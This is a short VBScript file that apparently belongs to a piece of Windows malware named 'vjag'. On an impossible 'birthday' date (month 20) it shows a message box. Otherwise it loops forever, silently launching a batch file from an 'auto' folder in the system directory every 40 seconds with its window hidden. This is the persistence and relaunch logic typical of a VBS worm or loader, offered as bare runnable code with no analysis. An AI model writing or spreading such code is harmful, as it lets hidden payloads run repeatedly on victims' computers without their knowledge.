if  Month(Date)=20 and Day(Date)=22 then
a=msgbox("::::::......My Birthday......::::::",,"vjag:::::..999..:::::")
else
Set ws = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set car = fso.GetSpecialFolder(1)
v = car.Path 
do
ws.run ""&v&"\auto\vjag.bat open" ,0, false
WScript.Sleep 40000
Loop 
end if